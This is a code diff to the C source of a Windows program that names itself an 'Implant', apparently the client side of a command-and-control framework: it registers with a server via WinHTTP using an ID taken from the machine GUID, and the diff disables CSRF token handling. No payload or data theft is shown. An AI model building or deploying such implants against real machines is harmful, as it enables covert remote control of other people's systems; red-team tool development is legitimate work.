@@ -63,16 +63,36 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
                         -1,
                         WINHTTP_ADDREQ_FLAG_ADD);
 
+	/**
 	// Add CSRF Token header
 	if (strcmp(CSRFToken, "")) {
 		char str[sizeof(CSRFToken) + sizeof("X-CSRFToken: ")];
 		strcpy(str, "X-CSRFToken: ");
 		strcat(str, CSRFToken);
-		WinHttpAddRequestHeaders(hRequest,
+
+
+		int csrfBufferSize = MultiByteToWideChar(CP_UTF8,
+				MB_COMPOSITE,
 				str,
+				sizeof(str),
+				NULL,
+				sizeof(str));
+
+		LPWSTR csrfBuffer = malloc(csrfBufferSize);
+
+		csrfBufferSize = MultiByteToWideChar(CP_UTF8,
+                                MB_COMPOSITE,
+                                str,
+                                sizeof(str),
+                                csrfBuffer,
+                                sizeof(str));
+		
+		WinHttpAddRequestHeaders(hRequest,
+				csrfBuffer,
 				-1,
 				WINHTTP_ADDREQ_FLAG_ADD);
 	}
+	**/
 
         // Send the request
         if (!WinHttpSendRequest(hRequest,
@@ -80,9 +100,11 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
                                 0,
                                 buffer,
                                 stream.bytes_written,
-                                stream.bytes_written, 0)) {
+                                stream.bytes_written,
+				0)) {
                 printf("Failed to send request. Error: %ld\n", GetLastError());
         }
+
         // Receive the response
         if (WinHttpReceiveResponse(hRequest, NULL)) {
                 DWORD dwSize = 0;
@@ -95,7 +117,7 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
                         if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                 printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
                         }
-			printf("dwSize = %lu", dwSize);
+			// printf("dwSize = %lu", dwSize);
 
                         // Allocate space for the data
                         responseBuffer = (LPSTR)malloc(dwSize + 1);
@@ -139,22 +161,6 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
 
 }
 
-
-int GetCSRFToken() {
-	uint8_t buffer[4096];
-	pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
-	LPSTR response = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
-
-	if (strcmp(response, "")){
-		DEBUG_PRINTF("Failed to get a CSRF Token from Server.");
-		DEBUG_PRINTF("response = %s", response);
-		return 1;
-	}
-
-	CSRFToken = response;
-	printf("NEW CSRF TOKEN = %s\n", CSRFToken);
-	return 0;
-}
 
 // Function to set the ImplantID using the machine's GUID
 void ReadMachineGUID() {
@@ -202,7 +208,7 @@ int RegisterSelf() {
 	if (strcmp(response, "")){
                 DEBUG_PRINTF("Bad response.");
                 DEBUG_PRINTF("response = %s", response);
-        }	
+        }
 	
 	return 0;
 }
@@ -211,17 +217,7 @@ int RegisterSelf() {
 int main() {
 	DEBUG_PRINTF("Starting Implant.\n");
 	
-	
-	int result = GetCSRFToken();
-	
-	if (result == 1) {
-                DEBUG_PRINTF("Failed to get CSRF token from the Server!\n");
-                printf("CSRF TOKEN = %s", CSRFToken);
-		return 1;
-        }
-        printf("Successfully recieved CSRF token from Server\n");
-
-	result = RegisterSelf();
+	int result = RegisterSelf();
 
 	if (result == 1) {
 		DEBUG_PRINTF("Failed to Register with the Server!\n");
